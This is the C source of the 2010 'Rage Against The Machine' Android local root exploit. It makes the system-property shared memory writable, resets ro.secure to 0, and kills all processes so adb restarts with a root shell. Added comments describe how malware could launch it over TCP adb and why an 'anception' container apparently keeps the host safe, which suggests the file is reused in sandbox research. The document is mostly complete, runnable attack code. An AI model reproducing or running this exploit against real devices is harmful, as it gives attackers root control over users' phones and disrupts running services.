/* ro.secure reset exploit for all androids < 2.3.
 *
 * Rage Against The Machine: Killing In The Name Of
 *
 * (C) 2010 The Android Exploid Crew
 * This exploit resets ro.secure to 0 even if executed as user.
 * Then re-connect to the device via "adb -d shell" to get a rootshell.
 *
 * Explanation:
 * The /dev/ashmem protection implementation is buggy. Anyone can
 * re-map the shared mem (which is owned by init and contains the system
 * properties) to R/W permissions. Then simply re-set ro.secure to 0
 * and restart adb which then runs as root rather than shell-user.

 This exploit can be made local if ADB is running in TCP mode.
 If so, then a malware on the device can establish a connection
 to adb from within the device and send the command to it
 to run this exploit file. A user doesn't have to connect via a USB
 cable. I did this for the Parrot Asteroid in a previous paper (FM Radio hacking).

 For anception, since ADB is not in the malware's container, any attempt
 to locate ADB will be redirected to the container. So even though the
 property space is remapped ro.secure=0 on the host, the exploit
 kills the container version of ADB where the property space is as it
 is. Even if the exploit managed to change the property space
 within the container, then it is communicating with a root ADB INSIDE
 the container. Host is still safe.

 */

#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

#define PA_SIZE 32768
#define PA_INFO_START 1024
#define DEFAULTPROP 0x40000000
#define PROP_NAME_MAX   32
#define PROP_VALUE_MAX  92

struct prop_info {
	char name[PROP_NAME_MAX];
	unsigned volatile serial;
	char value[PROP_VALUE_MAX];
};


struct prop_area {
	unsigned volatile count;
	unsigned volatile serial;
	unsigned magic;
	unsigned version;
	unsigned reserved[4];
	unsigned toc[1];
};


char *find_prop_area()
{
	char buf[256];
	char *val = NULL;

	//opened on host since its accessing self
	//the read and close also on host because
	//the fds are produced by the host
	FILE *f = fopen("/proc/self/maps", "r");
	if (!f)
		die("[-] fopen");
	for (;!feof(f);) {
		if (!fgets(buf, sizeof(buf), f))
			break;
		if (strstr(buf, "system_properties") != NULL) {
                        val = strchr(buf, '-');
                        if (!val)
                                break;
                        *val = 0;
                        val = (char *)strtoul(buf, NULL, 16);
                        break;
                }
        }
        fclose(f);
        return val;
}


void restart_adb()
{
	kill(-1, 9);
}


int main(int argc, char **argv)
{
	char *prop = NULL;
	struct prop_info *pi = NULL;
	struct prop_area *pa = NULL;


	printf("[*] CVE-2010-743C Android local root exploit (C) 2010 743C\n");
	printf("[*] The Android Exploid Crew Gentlemens club - dominating robots since 2008.\n\n");
	printf("[*] Donate to 7-4-3-C@web.de if you like\n\n");

	sleep(3);

	prop = find_prop_area();

	if (!prop)
		die("[-] Cannot find prop area");

	printf("[+] Found prop area @ %p\n", prop);
	if (mprotect(prop, PA_SIZE, PROT_READ|PROT_WRITE) < 0)
		die("[-] mprotect");

	pi = (struct prop_info *)(prop + PA_INFO_START);
	pa = (struct prop_area *)prop;

	while (pa->count--) {
		printf("[*] %s: %s\n", pi->name, pi->value);
		if (strcmp(pi->name, "ro.secure") == 0) {
			strcpy(pi->value, "0");
			printf("[+] ro.secure resetted to 0\n");
			break;
		}
		++pi;
	}
	printf("[*] Restarting adb. Please reconnect for rootshell (adb kill-server; adb -d shell).\n");
	fflush(stdout); sleep(2);
	restart_adb();
	return 0;
}

